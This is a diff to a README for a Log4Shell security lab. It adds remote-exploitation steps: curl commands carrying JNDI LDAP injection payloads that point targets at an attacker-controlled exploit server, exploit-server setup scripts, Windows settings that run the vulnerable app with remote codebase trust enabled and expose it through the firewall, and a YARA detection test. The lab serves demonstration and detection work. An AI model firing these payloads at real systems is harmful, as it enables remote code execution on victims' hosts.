@@ -28,6 +28,9 @@
 # Start simple version (working one)
 docker-compose -f docker-compose-simple.yml up -d
 
+# Start with exposed ports for remote access
+docker-compose -f docker-compose-remote.yml up -d
+
 # Stop lab
 docker-compose -f docker-compose-simple.yml down
 
@@ -40,11 +43,31 @@ docker ps
 # Test vulnerability (should show Java version expansion)
 docker exec attacker-machine curl -H "User-Agent: test_\${java:version}" http://log4shell-simple:8080
 
-# Test exploitation
+# Test exploitation (internal)
 docker exec attacker-machine curl -H "User-Agent: \${jndi:ldap://ldap-exploit-server:1389/Exploit}" http://log4shell-simple:8080
+
+# Test remote exploitation (use IP addresses, not hostnames!)
+curl -H "User-Agent: \${jndi:ldap://10.0.0.8:1389/Exploit}" http://10.0.0.13:8081
 
 # Check if exploit worked
 docker exec log4shell-simple ls -la /tmp/pwned.txt
+```
+
+### Remote Exploitation Fix
+```bash
+# Problem: "UnknownHostException: attacker.local"
+# Solution: Use IP addresses instead of hostnames
+
+# From remote attacker (10.0.0.8):
+curl -H "User-Agent: \${jndi:ldap://10.0.0.8:1389/Exploit}" http://10.0.0.13:8081
+
+# Setup remote exploit server on attacker:
+cd ~/log4shell-remote
+bash setup-remote-exploit.sh
+./start_servers.sh
+
+# Then run exploit:
+./exploit.sh
 ```
 
 ### Container Access
@@ -150,13 +173,52 @@ docker system prune -f
 docker-compose -f docker-compose-simple.yml up -d --build
 ```
 
+## Windows Native Setup (Alternative to Docker)
+
+### Running Vulnerable App Directly on Windows
+```batch
+cd vulnerable-simple
+javac -cp ".;log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" SimpleVulnerable.java
+
+# Run with screen output and logging
+powershell -Command "java -cp '.;log4j-core-2.14.1.jar;log4j-api-2.14.1.jar' '-Dcom.sun.jndi.ldap.object.trustURLCodebase=true' '-Dcom.sun.jndi.rmi.object.trustURLCodebase=true' '-Dcom.sun.jndi.cosnaming.object.trustURLCodebase=true' SimpleVulnerable 2>&1 | Tee-Object -FilePath app.log"
+```
+
+### Windows Firewall Configuration
+```batch
+# Allow port through Windows Firewall (run as Administrator)
+netsh advfirewall firewall add rule name="Log4Shell Lab Port 8081" dir=in action=allow protocol=TCP localport=8081
+
+# Check if port is listening
+netstat -an | findstr :8081
+
+# Test local access
+curl -I http://localhost:8081
+```
+
+### YARA Detection on Windows
+```batch
+# Create test file and scan
+echo User-Agent: ${jndi:ldap://attacker.local:1389/Exploit} > test-log4shell.log
+yara64.exe detection-rules\log4shell-enhanced.yar test-log4shell.log
+
+# Scan captured application logs
+yara64.exe detection-rules\log4shell-enhanced.yar vulnerable-simple\app.log
+```
+
+### Network Troubleshooting
+- **App binds to**: 0.0.0.0:8080/8081 (all interfaces)
+- **External access requires**: Windows Firewall rule + router port forwarding (if behind NAT)
+- **Test command**: `netstat -an | findstr :8081` should show `0.0.0.0:8081`
+
 ## Current Lab Status - FULLY OPERATIONAL ✅
-1. **Vulnerable App**: ✅ Running and processing JNDI lookups
-2. **JNDI Processing**: ✅ Confirmed working - `${java:version}` expands correctly
-3. **LDAP Connections**: ✅ Established successfully with exploit server
-4. **Detection Tools**: ✅ All working - YARA, Sigma, Nuclei detecting threats
-5. **Security Demonstration**: ✅ Ready for comprehensive Log4Shell demos
-6. **Documentation**: ✅ Complete with working commands and detection results
+1. **Docker Setup**: ✅ Running and processing JNDI lookups
+2. **Windows Native**: ✅ Direct Java execution with proper network binding
+3. **JNDI Processing**: ✅ Confirmed working - `${java:version}` expands correctly
+4. **LDAP Connections**: ✅ Established successfully with exploit server
+5. **Detection Tools**: ✅ All working - YARA, Sigma, Nuclei detecting threats
+6. **Security Demonstration**: ✅ Ready for comprehensive Log4Shell demos
+7. **Documentation**: ✅ Complete with working commands and detection results
 
 ## File Locations
 - **Lab Files**: `~/log4shell-security-lab/`
